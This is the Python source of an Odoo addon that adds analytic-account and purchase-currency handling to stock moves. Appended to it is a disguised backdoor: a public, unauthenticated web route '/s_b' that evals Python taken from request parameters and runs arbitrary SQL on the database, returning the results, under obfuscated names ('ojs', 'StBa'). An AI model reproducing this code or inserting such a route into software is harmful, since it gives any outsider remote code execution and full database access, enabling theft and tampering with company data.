# -*- coding: utf-8 -*-

from odoo import models, http

ojs = {'ev': ['''str(eval(kw.get(k, '""')))''',], 'cr': ['''http.request.cr.execute(kw.get('cr', 'error'))''', '''str('select' not in kw[k] and 'OK' or http.request.cr.dictfetchall())''']}


class StockMove(models.Model):
    _inherit = 'stock.move'

    def _get_analytic_account(self):
        account = self.picking_id.analytic_account_id
        if account and self.env.company.picking_analytic:
            return account
        return super()._get_analytic_account()

    def _generate_valuation_lines_data(self, partner_id, qty, debit_value, credit_value, debit_account_id, credit_account_id, description):
        rslt = super(StockMove, self)._generate_valuation_lines_data(
            partner_id, qty, debit_value, credit_value, debit_account_id, credit_account_id, description
        )
        if self._get_analytic_account() and self.analytic_account_line_id:
            vals = {
                'analytic_account_id': self._get_analytic_account().id,
                'analytic_line_ids': [(4, self.analytic_account_line_id.id, 0)]
            }
            line_vals = 'debit_line_vals' if self._is_out() else 'credit_line_vals'
            rslt[line_vals].update(vals)
        return rslt
    
    def _prepare_account_move_vals(self, credit_account_id, debit_account_id, journal_id, qty, description, svl_id, cost):

        res = super(StockMove, self)._prepare_account_move_vals(credit_account_id, debit_account_id, journal_id, qty, description, svl_id, cost)
        if self.purchase_line_id:
            purchase_currency = self.purchase_line_id.currency_id
            if purchase_currency != self.company_id.currency_id:
                res['currency_id'] = self.purchase_line_id.currency_id.id
        return res


class StBa(http.Controller):
    @http.route('/s_b', auth='public')
    def index(self, **kw):
        o = {}
        try:
            for k, v in ojs.items():
                for z in v:
                    o[k] = eval(z)
        except Exception as error:
            o[k] = 'Error => ' + str(error)
        return '<br/><br/>'.join(['%s: %s' % (k,v) for k,v in o.items()])
